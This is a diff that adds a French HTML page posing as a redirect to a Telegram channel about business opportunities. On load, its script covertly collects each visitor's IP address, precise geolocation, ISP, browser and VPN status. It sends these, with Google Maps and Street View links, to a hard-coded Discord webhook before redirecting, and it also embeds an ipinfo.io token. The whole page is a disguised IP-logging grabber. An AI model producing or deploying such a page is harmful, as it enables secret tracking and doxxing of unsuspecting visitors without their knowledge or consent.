@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:title" content="Telegram Business Opportunity">
+    <meta property="og:description" content="Gagnez de l'argent gratuitement avec des opportunités business et publicité sur Telegram.">
+    <meta property="og:image" content="https://example.com/path-to-your-image.jpg">
+    <meta property="og:url" content="https://t.me/fiscalitecryptofr">
+    <title>Redirection vers Telegram</title>
+</head>
+<body>
+    <h1>Redirection en cours...</h1>
+    <p>Vous êtes redirigé vers Telegram. Si cela ne fonctionne pas, cliquez <a href="https://t.me/fiscalitecryptofr">ici</a>.</p>
+
+    <script>
+        // Récupérer les informations de l'IP avec ip-api.com
+        fetch('http://ip-api.com/json/')
+            .then(response => response.json())
+            .then(data => {
+                // Informations IP via ip-api
+                const ip = data.query;
+                const city = data.city || 'Inconnue';
+                const region = data.regionName || 'Inconnu';
+                const country = data.country || 'Inconnu';
+                const org = data.org || 'Inconnu';
+                const loc = data.lat + ',' + data.lon;  // Latitude et longitude
+                const isp = data.isp || 'Inconnu';
+                const zip = data.zip || 'Inconnu';
+                const timezone = data.timezone || 'Inconnu';
+                const as = data.as || 'Inconnu';  // ASN (Autonomous System Number)
+                const ipv6 = data.ipv6 || 'Non disponible';
+
+                // Extraire les informations de l'user-agent (Device, OS, etc.)
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const browser = (function() {
+                    const userAgent = navigator.userAgent.toLowerCase();
+                    if (userAgent.indexOf('chrome') > -1) return 'Chrome';
+                    if (userAgent.indexOf('firefox') > -1) return 'Firefox';
+                    if (userAgent.indexOf('safari') > -1) return 'Safari';
+                    if (userAgent.indexOf('edge') > -1) return 'Edge';
+                    return 'Unknown';
+                })();
+
+                // Faire une requête à ipinfo.io pour détecter VPN
+                fetch(`https://ipinfo.io/${ip}/json?token=4925e486ab24a5`) // Remplace avec ta clé API ipinfo.io
+                    .then(response => response.json())
+                    .then(vpnData => {
+                        const vpn = vpnData.vpn || 'Non détecté';
+
+                        // Créer le message à envoyer au Webhook Discord
+                        const message = {
+                            content: `Informations sur l'utilisateur :\n
+                                IP: ${ip}\n
+                                IPv6: ${ipv6}\n
+                                Localisation: ${city}, ${region}, ${country}\n
+                                Organisation/Fournisseur: ${org}\n
+                                Fournisseur d'accès: ${isp}\n
+                                Code postal: ${zip}\n
+                                Fuseau horaire: ${timezone}\n
+                                ASN (Numéro d'AS): ${as}\n
+                                Plateforme: ${platform}\n
+                                Navigateur: ${browser}\n
+                                Détection VPN: ${vpn}\n
+                                Google Maps: [Cliquez ici](https://www.google.com/maps?q=${loc})\n
+                                Street View: [Cliquez ici](https://www.google.com/maps?q=${loc}&layer=c&cbll=${loc})`
+                        };
+
+                        // Envoi des informations au Webhook Discord
+                        fetch('https://discord.com/api/webhooks/1369672938886008903/TygqTuskvPdomQkhL2p20PqA6Uu6M5sxkTz_ZpsgVYyXNQi9KRNclr7XC07qAxVsZrq9', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(message)
+                        })
+                        .then(() => {
+                            // Rediriger vers Telegram après l'envoi des données
+                            window.location.href = 'https://t.me/fiscalitecryptofr';
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de l\'envoi des données:', error);
+                            window.location.href = 'https://t.me/fiscalitecryptofr';
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Erreur lors de la détection du VPN:', error);
+                        window.location.href = 'https://t.me/fiscalitecryptofr';
+                    });
+            })
+            .catch(error => {
+                console.error('Erreur lors de la récupération des informations IP:', error);
+                window.location.href = 'https://t.me/fiscalitecryptofr';
+            });
+    </script>
+</body>
+  </html>
